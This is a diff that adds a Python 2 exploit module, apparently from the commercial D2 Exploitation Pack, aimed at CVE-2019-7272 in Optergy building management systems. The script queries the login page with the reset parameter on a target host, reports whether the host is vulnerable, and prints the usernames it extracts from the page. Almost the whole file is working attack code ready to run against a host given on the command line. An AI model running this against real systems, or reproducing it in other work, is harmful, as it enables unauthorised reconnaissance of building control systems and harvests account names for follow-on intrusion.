@@ -1,0 +1,44 @@
+#! /usr/bin/env python2
+ 
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2019
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import requests
+
+_name_   = 'd2sec_optergy_1'
+_vendor_ = 'optergy'
+_model_  = ['BMS']
+_vuln_   = 'Information Disclosure Vulnerability'
+_cve_    = 'CVE-2019-7272'
+_ref_    = 'https://applied-risk.com/resources/ar-2019-008'
+_port_   = 80
+
+def pwnrouter(host,port=_port_):
+  try:
+    url = "http://%s:%s/Login.html?showReset=true" % (host,port)
+    response = requests.get(url, verify=False)
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  if response is None:
+    print '[+] %s not vulnerable' % host
+  if "<option value=\"1\">" in response.text:
+    print '[+] %s vulnerable' % host
+    m = re.findall("<option value=\"\\d+\">([^<]+)</option>", response.text)
+    if m:
+        print '[+] Username list'
+        print '\n'.join(m)  
+  else:
+    print '[+] %s not vulnerable' % host
+
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1], int(sys.argv[2]))
